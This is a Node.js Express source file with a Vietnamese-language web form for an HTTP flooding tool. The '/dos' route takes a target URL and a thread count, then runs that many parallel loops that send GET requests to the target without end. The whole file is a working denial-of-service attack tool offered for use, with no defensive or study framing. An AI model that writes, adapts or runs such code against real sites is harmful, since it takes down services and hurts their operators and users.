const express = require('express');
const axios = require('axios');
const async = require('async');

const app = express();
app.use(express.urlencoded({ extended: true }));

app.get('/', (req, res) => {
    res.send(`
        <html>
        <body>
            <form action="/dos" method="post">
                <label for="url">Nhập URL:</label><br>
                <input type="text" id="url" name="url" required><br>
                <label for="threads">Số lượng threads:</label><br>
                <input type="number" id="threads" name="threads" required min="1"><br>
                <button type="submit">Gửi Yêu Cầu</button><br>
            </form>
            <div id="result"></div>
        </body>
        </html>
    `);
});

app.post('/dos', async (req, res) => {
    const url = req.body.url;
    const threads = parseInt(req.body.threads, 10);
    
    if (!url.startsWith('http')) {
        return res.send('URL không hợp lệ. Vui lòng nhập URL bắt đầu bằng http:// hoặc https://');
    }
    
    if (isNaN(threads) || threads <= 0) {
        return res.send('Số lượng threads không hợp lệ!');
    }

    const results = [];
    const tasks = Array.from({ length: threads }).map(() => async () => {
        while (true) {
            try {
                await axios.get(url);
                results.push('Yêu cầu đã được gửi!');
            } catch (error) {
                results.push('Lỗi kết nối!');
            }
        }
    });

    async.parallel(tasks, (err) => {
        if (err) {
            return res.send('Đã xảy ra lỗi trong khi gửi yêu cầu.');
        }
        res.send(`Quá trình xử lý đã hoàn tất. Số yêu cầu đã gửi: ${results.length}`);
    });
});

app.listen(3000, () => {
    console.log('Server đang chạy trên http://localhost:3000');
});
